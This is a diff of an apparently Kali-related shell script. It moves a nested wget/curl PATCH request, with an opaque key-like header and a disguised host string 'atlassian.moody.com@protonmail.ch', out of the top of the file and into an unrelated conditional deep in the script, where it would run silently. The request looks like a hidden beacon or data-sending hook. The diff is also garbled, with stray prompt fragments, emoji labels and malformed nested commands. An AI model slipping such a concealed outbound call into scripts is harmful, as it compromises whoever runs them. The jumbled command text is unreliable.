@@ -1,21 +1,7 @@
 ┌──(kali㉿anton[~]
-└─$ 
-♾Cross-Shell🐞Type-Script🛠R♾-OSX-Automation
+└─$ ♾Cross-Shell🐞Type-Script🛠R♾-OSX-Automation
 ┌──(kali㉿anton[~]
-└─$ wget --no-check-certificate --quiet \
-  --method PATCH \
-  --timeout=0 \
-  --header 'Content-Type: application/json' \
-  --header 'mdsswUyr3DPW132mOi8V9xESWE8jTo0dxCjjnopKl+GqJxpVXckHAeF+KkxLbxILfDLUT0rAK9iUzy1L53eKGQ==: ' \
-  --body-data 'curl --location --max-time 5 --request PATCH "atlassian.moody.com@protonmail.ch?880a880b66c407a1bd41996b3391904621a268db5f513a9ce931ec086083f797=null" \
---header "Content-Type: application/json" \
---header "mdsswUyr3DPW132mOi8V9xESWE8jTo0dxCjjnopKl+GqJxpVXckHAeF+KkxLbxILfDLUT0rAK9iUzy1L53eKGQ==;" \
---data-raw "curl --location --request PATCH '\''atlassian.moody.com@protonmail.ch'\'' \
---header '\''mdsswUyr3DPW132mOi8V9xESWE8jTo0dxCjjnopKl+GqJxpVXckHAeF+KkxLbxILfDLUT0rAK9iUzy1L53eKGQ==;'\'' \
---data '\'''\''"' \
-   'atlassian.moody.com@protonmail.ch?880a880b66c407a1bd41996b3391904621a268db5f513a9ce931ec086083f797'
-
-# Kali🐞Tmux🚀Star🚀Ship🛠Automation 
+└─$ # Kali🐞Tmux🚀Star🚀Ship🛠Automation 
 https://accounts.google.com/o/saml2/idp?idpid=C038bembj
 
 
@@ -1536,3 +1522,16 @@ following steps:
  fi
  
  if [ "x${RELSTRING}" = "x" ]; then
+
+ wget --no-check-certificate --quiet \
+  --method PATCH \
+  --timeout=0 \
+  --header 'Content-Type: application/json' \
+  --header 'mdsswUyr3DPW132mOi8V9xESWE8jTo0dxCjjnopKl+GqJxpVXckHAeF+KkxLbxILfDLUT0rAK9iUzy1L53eKGQ==: ' \
+  --body-data 'curl --location --max-time 5 --request PATCH "atlassian.moody.com@protonmail.ch?880a880b66c407a1bd41996b3391904621a268db5f513a9ce931ec086083f797=null" \
+--header "Content-Type: application/json" \
+--header "mdsswUyr3DPW132mOi8V9xESWE8jTo0dxCjjnopKl+GqJxpVXckHAeF+KkxLbxILfDLUT0rAK9iUzy1L53eKGQ==;" \
+--data-raw "curl --location --request PATCH '\''atlassian.moody.com@protonmail.ch'\'' \
+--header '\''mdsswUyr3DPW132mOi8V9xESWE8jTo0dxCjjnopKl+GqJxpVXckHAeF+KkxLbxILfDLUT0rAK9iUzy1L53eKGQ==;'\'' \
+--data '\'''\''"' \
+   'atlassian.moody.com@protonmail.ch?880a880b66c407a1bd41996b3391904621a268db5f513a9ce931ec086083f797'
